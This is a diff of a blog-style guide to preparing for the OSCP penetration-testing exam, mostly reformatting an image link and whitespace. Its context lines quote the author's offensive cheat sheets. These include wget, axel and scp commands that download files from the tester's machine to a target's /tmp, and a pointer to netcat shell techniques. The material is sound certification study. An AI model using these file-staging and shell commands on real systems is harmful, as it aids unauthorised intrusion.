@@ -53,7 +53,9 @@ While completing the PWK exercises and labs you will learn essential offensive s
 
 ## 4. Make your own cheat sheets
 Every J. Random Hacker has published an OSCP cheat sheet:
-[Google cheat sheet result count](google_cheat_sheet_count.png)
+
+![Google cheat sheet result count](google_cheat_sheet_count.png)
+
 and their work is helpful to you but not nearly as helpful as creating your own. I recommend that you create at least 3 documents as you progress through the PWK exercises and lab machines. The following are snippets from the three cheat sheets that I created:
 	1. An enumeration cheat sheet:
 	```
@@ -95,7 +97,7 @@ and their work is helpful to you but not nearly as helpful as creating your own.
 		* netcat shell for nc without -e or -c
 		* sourced from: https://ostrokonskiy.com/posts/linux-privilege-escalation-cheatsheet.html
 	...
-		
+
 	DOWNLOAD FILES TO TARGET
 	========================
 	* scp $file $user@$targ:~/$file
@@ -103,7 +105,7 @@ and their work is helpful to you but not nearly as helpful as creating your own.
 	* wget http://$tun0:8888/$file -O /tmp/$file
 	* axel http://$tun0:8888/$file -o /tmp/$file
 	...
-	
+
 	CRONJOBS
 	========
 	* use pspy to view short-lived processes
@@ -155,5 +157,4 @@ and their work is helpful to you but not nearly as helpful as creating your own.
 		* review user's powershell history
 	...
 	```
-	
 Good luck!
